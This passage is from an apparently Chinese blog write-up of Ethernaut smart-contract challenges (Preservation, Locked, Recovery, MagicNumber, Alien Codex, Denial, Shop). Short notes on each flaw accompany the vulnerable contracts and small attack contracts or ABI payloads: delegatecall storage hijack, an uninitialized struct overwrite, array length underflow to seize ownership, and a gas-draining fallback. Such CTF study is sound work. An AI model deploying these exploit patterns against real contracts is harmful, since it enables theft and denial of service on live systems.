class="keyword">return</span> token.totalSupply;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">balanceOf</span><span class="params">(address who)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.balanceOf(who);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">allowance</span><span class="params">(address owner, address spender)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.allowance(owner, spender);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">transfer</span><span class="params">(address to, uint value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool ok)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.transfer(to, value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">transferFrom</span><span class="params">(address from, address to, uint value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool ok)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.transferFrom(from, to, value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">approve</span><span class="params">(address spender, uint value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool ok)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> token.approve(spender, value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">event <span class="title">Transfer</span><span class="params">(address indexed from, address indexed to, uint value)</span></span>;</span><br><span class="line">   <span class="function">event <span class="title">Approval</span><span class="params">(address indexed owner, address indexed spender, uint value)</span></span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">    string <span class="keyword">public</span> constant name = <span class="string">'NaughtCoin'</span>;</span><br><span class="line">    string <span class="keyword">public</span> constant symbol = <span class="string">'0x0'</span>;</span><br><span class="line">    uint <span class="keyword">public</span> constant decimals = <span class="number">18</span>;</span><br><span class="line">    uint <span class="keyword">public</span> timeLock = now + <span class="number">10</span> years;</span><br><span class="line">    uint <span class="keyword">public</span> INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span> ** decimals);</span><br><span class="line">    address <span class="keyword">public</span> player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) <span class="keyword">public</span> &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">        balanceOf[player] = INITIAL_SUPPLY;</span><br><span class="line">        Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">transfer</span><span class="params">(address _to, uint256 _value)</span> lockTokens <span class="keyword">public</span> <span class="title">returns</span><span class="params">(bool)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">    <span class="function">modifier <span class="title">lockTokens</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">            require(now &gt; timeLock);</span><br><span class="line">            <span class="keyword">if</span> (now &lt; timeLock) &#123;</span><br><span class="line">                _;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-Preservation"><a href="#0x10-Preservation" class="headerlink" title="0x10 Preservation"></a>0x10 Preservation</h2><p>考点delegatecall。传地址字符串，坑坏我了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">  address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">  address <span class="keyword">public</span> owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">"setTime(uint256)"</span>));</span><br><span class="line">  </span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) <span class="keyword">public</span> &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function">function <span class="title">setFirstTime</span><span class="params">(uint _timeStamp)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function">function <span class="title">setSecondTime</span><span class="params">(uint _timeStamp)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setTime</span><span class="params">(uint _time)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">  address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">  address <span class="keyword">public</span> owner;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setTime</span><span class="params">(uint _time)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">      owner = <span class="number">0x0Ed04C1C495407d394C493587d4cB2474d0726a3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x11-Locked"><a href="#0x11-Locked" class="headerlink" title="0x11 Locked"></a>0x11 Locked</h2><p>考点是旧版struct默认是storage，它声明未初始化指针指向slot 0。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.23; </span><br><span class="line"></span><br><span class="line"><span class="comment">// A Locked Name Registrar</span></span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool <span class="keyword">public</span> unlocked = <span class="keyword">false</span>;  <span class="comment">// registrar locked, no name updates</span></span><br><span class="line"></span><br><span class="line">    struct NameRecord &#123; <span class="comment">// map hashes to addresses</span></span><br><span class="line">        bytes32 name; <span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; NameRecord) <span class="keyword">public</span> registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(bytes32 =&gt; address) <span class="keyword">public</span> resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">register</span><span class="params">(bytes32 _name, address _mappedAddress)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        require(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    <span class="function">function <span class="title">hack</span><span class="params">(address param)</span></span>&#123;</span><br><span class="line">       Locked locked = Locked(param);</span><br><span class="line">       locked.register(bytes32(<span class="number">1</span>),address(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-Recovery"><a href="#0x12-Recovery" class="headerlink" title="0x12 Recovery"></a>0x12 Recovery</h2><p>此题考点合约地址的计算。</p>
+<p><code>new_addr = address(keccak256(RLP([sender_address,nonce])))</code></p>
+<p>nonce是1，sender_address是instance，RLP看文档用python跑一下。</p>
+<p>也可能在ropsten上查。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.23;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function">function <span class="title">generateToken</span><span class="params">(string _name, uint256 _initialSupply)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string <span class="keyword">public</span> name;</span><br><span class="line">  mapping (address =&gt; uint) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  constructor(string _name, address _creator, uint256 _initialSupply) <span class="keyword">public</span> &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  function() <span class="keyword">public</span> payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value*<span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(address _to, uint _amount)</span> <span class="keyword">public</span> </span>&#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function">function <span class="title">destroy</span><span class="params">(address _to)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x13-MagicNumber"><a href="#0x13-MagicNumber" class="headerlink" title="0x13 MagicNumber"></a>0x13 MagicNumber</h2><p>没看明白。</p>
+<p><a href="https://www.jianshu.com/p/d9137e87c9d3" target="_blank" rel="noopener">一个新合约被创建后会发生什么</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address <span class="keyword">public</span> solver;</span><br><span class="line"></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">setSolver</span><span class="params">(address _solver)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x14-Alien-Codex"><a href="#0x14-Alien-Codex" class="headerlink" title="0x14 Alien Codex"></a>0x14 Alien Codex</h2><p>这题是典型的下溢，通过使length下溢。<br>先要把contact设成true，看文档中<a href="https://solidity.readthedocs.io/en/v0.4.25/abi-spec.html#use-of-dynamic-types" target="_blank" rel="noopener">函数参数编码</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func=&quot;0x1d3d4c0b&quot;; // 函数 id</span><br><span class="line">data1=&quot;0000000000000000000000000000000000000000000000000000000000000020&quot;// 偏移</span><br><span class="line">data2=&quot;1000000000000000000000000000000000000000000000000000000000000001&quot;// 长度</span><br></pre></td></tr></table></figure>
+<p>然后调retract()使length溢出。然后计算owner的位置，找到对应的codex[i]，修改，换成自己的地址。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.24;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">  bool <span class="keyword">public</span> contact;</span><br><span class="line">  bytes32[] <span class="keyword">public</span> codex;</span><br><span class="line">  <span class="function">modifier <span class="title">contacted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">assert</span>(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">make_contact</span><span class="params">(bytes32[] _firstContactMessage)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">assert</span>(_firstContactMessage.length &gt; <span class="number">2</span>**<span class="number">200</span>);</span><br><span class="line">    contact = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">record</span><span class="params">(bytes32 _content)</span> contacted <span class="keyword">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">retract</span><span class="params">()</span> contacted <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">function <span class="title">revise</span><span class="params">(uint i, bytes32 _content)</span> contacted <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x15-Denial"><a href="#0x15-Denial" class="headerlink" title="0x15 Denial"></a>0x15 Denial</h2><p>不让它的伙伴提钱，fallback抛异常，要使transfer失败，assert异常后会转走所有gas。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.24;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address <span class="keyword">public</span> partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address <span class="keyword">public</span> constant owner = <span class="number">0xA9E</span>;</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setWithdrawPartner</span><span class="params">(address _partner)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance/<span class="number">100</span>;</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.call.value(amountToSend)();</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    function() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="function">function <span class="title">contractBalance</span><span class="params">()</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        <span class="keyword">assert</span>(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x16-Shop"><a href="#0x16-Shop" class="headerlink" title="0x16 Shop"></a>0x16 Shop</h2><p>像电梯一样，sao一下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint <span class="keyword">public</span> price = <span class="number">100</span>;</span><br><span class="line">  bool <span class="keyword">public</span> isSold;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">buy</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price.gas(<span class="number">3000</span>)() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="keyword">true</span>;</span><br><span class="line">      price = _buyer.price.gas(<span class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    <span class="function">function <span class="title">price</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Shop(msg.sender).isSold()==<span class="keyword">true</span>?<span class="number">0</span>:<span class="number">100</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">hack</span> <span class="params">(address param)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        Shop shop = Shop(param);</span><br><span class="line">        shop.buy();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                
+<p class="pink-link-context">
+    <a href="/2019/05/10/iSmart逆向分析之绕过签名验证/" rel="next" title="iSmart逆向分析之绕过签名验证">
+    Prev: iSmart逆向分析之绕过签名验证
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2019/03/18/Ethereum-vuln/" rel="next" title="以太坊漏洞 TOP9">
+    Next: 以太坊漏洞 TOP9
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect pink" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse pink darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer pink accent-1 darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="https://github.com/cracke-s-j" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
+                
+                    <a class="social-link" href="https://blog.dyf.ink/" target="_blank">友情链接 dyf&#39;s blog</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2020 ssj, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
